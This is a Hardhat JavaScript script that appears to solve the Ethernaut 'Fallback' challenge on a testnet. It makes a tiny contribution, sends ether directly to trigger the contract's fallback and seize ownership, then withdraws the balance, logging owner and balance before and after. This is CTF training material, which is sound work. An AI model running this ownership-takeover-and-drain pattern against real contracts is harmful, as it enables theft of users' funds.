const { ethers, network, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");
const {
  abi: FallbackABI,
} = require("../artifacts/contracts/01-fallback/Fallback.sol/Fallback.json");

async function attack() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const [attacker] = await ethers.getSigners();
    const attackerAddr = await attacker.getAddress();

    const aFallback = networkConfig[chainId]["fallback"];
    const cFallback = new ethers.Contract(aFallback, FallbackABI, attacker);

    const balanceBefore = await provider.getBalance(aFallback);
    const ownerBefore = await cFallback.owner();
    console.log("Fallback contract owner before attack: ", ownerBefore);
    console.log(
      "Fallback contract balance before attack: ",
      balanceBefore.toString()
    );

    console.log("Attacking...");
    const tx1 = await cFallback.contribute({ value: "1" });
    await tx1.wait();
    const tx2 = await attacker.sendTransaction({ to: aFallback, value: "1" });
    await tx2.wait();
    const tx3 = await cFallback.withdraw();
    await tx3.wait();

    const balanceAfter = await provider.getBalance(aFallback);
    const ownerAfter = await cFallback.owner();
    console.log("Fallback contract owner after attack: ", ownerAfter);
    console.log(
      "Fallback contract balance after attack: ",
      balanceAfter.toString()
    );
  }
}

attack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
